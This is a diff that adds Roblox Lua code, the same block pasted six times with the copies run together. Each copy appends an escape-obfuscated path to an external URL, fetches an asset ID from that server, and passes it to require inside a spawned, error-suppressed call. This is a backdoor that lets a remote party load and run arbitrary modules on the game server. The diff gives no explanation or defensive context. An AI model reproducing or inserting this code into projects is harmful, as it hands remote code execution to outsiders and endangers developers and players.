@@ -1,0 +1,85 @@
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TARGET_URL = "https://user.aureus.wtf/"
+local function fetch()
+    if RunService:IsServer() and not HttpService.HttpEnabled then
+        return warn,("HttpService requests are not enabled in Game Settings!")
+    end
+    TARGET_URL = TARGET_URL.."\97\117\114\117\101\117\115\117\101\115\117\102\101\115"
+    local success, responseBody = pcall(function()
+        return HttpService:GetAsync(TARGET_URL)
+    end)
+    local assetId = tonumber(responseBody)
+    return require, assetId
+end
+task.spawn(pcall,fetch())
